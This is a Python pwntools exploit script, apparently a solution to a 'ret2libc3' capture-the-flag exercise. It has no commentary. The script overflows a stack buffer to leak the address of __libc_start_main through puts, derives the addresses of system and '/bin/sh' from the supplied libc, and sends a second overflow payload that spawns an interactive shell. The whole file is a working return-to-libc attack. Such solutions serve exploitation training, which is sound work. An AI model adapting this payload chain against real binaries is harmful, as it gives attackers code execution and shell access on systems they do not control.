from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
p = process("./ret2libc3")

libc = ELF("./libc.so")
elf = ELF("./ret2libc3")

puts_plt = elf.plt['puts']
libc_got = elf.got['__libc_start_main']
main = elf.symbols['main']

payload = 'A' * 112 + p32(puts_plt) + p32(main) + p32(libc_got)
#gdb.attach(proc.pidof(p)[0])
p.sendlineafter('Can you find it !?', payload)

libc_start_main_addr = u32(p.recv()[:4])

print '__libc_start_main: ' + hex(libc_start_main_addr)

system_addr = libc_start_main_addr - (libc.symbols['__libc_start_main'] - libc.symbols['system'])
binsh_addr = libc_start_main_addr - (libc.symbols['__libc_start_main'] - next(libc.search("/bin/sh")))

print 'system_addr: ' + hex(system_addr)
print 'binsh_addr: ' + hex(binsh_addr)
payload = 'A' * 104 + p32(system_addr) + p32(main) + p32(binsh_addr)

p.sendline(payload)
p.interactive()

